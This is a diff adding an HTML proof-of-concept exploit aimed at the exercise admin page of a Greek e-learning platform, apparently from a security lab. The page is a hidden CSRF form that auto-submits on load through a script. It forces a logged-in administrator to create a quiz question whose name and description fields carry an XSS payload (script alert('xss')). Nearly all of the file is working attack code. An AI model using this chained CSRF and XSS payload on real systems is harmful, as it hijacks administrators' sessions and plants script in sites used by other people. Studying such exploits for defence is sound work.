@@ -1,0 +1,30 @@
+
+ <form id='csrf_form' action='http://Eponymous.csec.gr/modules/exercice/admin.php?modifyQuestion=&newQuestion=yes' method='post'>
+
+<table width="99%" class="FormData"><tbody><tr><th width="220">&nbsp;</td>
+	<td><b>Στοιχεία ερώτησης</b></td>
+	</tr><tr>
+	<th class="left">Ερώτηση :</th>
+	<td><input type="text" name="questionName"size="50" maxlength="200" value="<script>alert('xss')</script>" style="width:400px;" class="FormData_InputText"></td></tr><tr><th class='left'>Προαιρετικό σχόλιο:</th><td>
+	<textarea wrap="virtual" name="questionDescription" value="<script>alert('xss')</script>" cols="50" rows="4" style="width:400px;" class="FormData_InputText"></textarea>
+	</td></tr><tr><th class='left'>Προσθήκη εικόνας :</th><td><input type='file' name='imageUpload' size='30' style='width:390px;'></td></tr>
+    <tr>
+      <th class='left'>Τύπος Απάντησης :</th>
+      <td><input type="radio" name="answerType" value="1" > Πολλαπλής Επιλογής (Μοναδική Απάντηση)
+          <br>
+          <input type="radio" name="answerType" value="2" checked="checked"> Πολλαπλής Επιλογής (Πολλαπλές Απαντήσεις)
+          <br>
+          <input type="radio" name="answerType" value="4" > Ταίριασμα
+          <br>
+          <input type="radio" name="answerType" value="3" > Συμπλήρωμα Κενών</td><tr><th>&nbsp;</td><td>
+	<input type='text' name='submitQuestion' value='Εντάξει'>
+	&nbsp;&nbsp;<input type='submit' name='cancelQuestion' value='Ακύρωση'>
+	</td></tr></tbody>
+</table>
+
+  <td><input class='FormData_InputText' type='text' name='submit' value='submit'></td>
+  </form>
+<script>
+    var form = document.querySelector("#csrf_form");
+    HTMLFormElement.prototype.submit.call(form);
+</script>
